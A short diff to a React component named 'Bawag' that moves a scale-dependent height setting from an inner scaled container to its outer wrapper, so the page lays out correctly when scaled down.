@@ -88,7 +88,13 @@ const Bawag = () => {
   const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
 
   return (
-    <div className="min-h-screen bg-white overflow-x-hidden" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
+    <div
+      className="min-h-screen bg-white overflow-x-hidden"
+      style={{
+        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+        height: scale < 1 && contentHeight ? `${contentHeight * scale}px` : undefined,
+      }}
+    >
       <div
         ref={contentRef}
         style={{
@@ -96,7 +102,6 @@ const Bawag = () => {
           margin: '0 auto',
           transform: `scale(${scale})`,
           transformOrigin: 'top center',
-          height: scale < 1 ? 'auto' : undefined,
         }}
       >
       
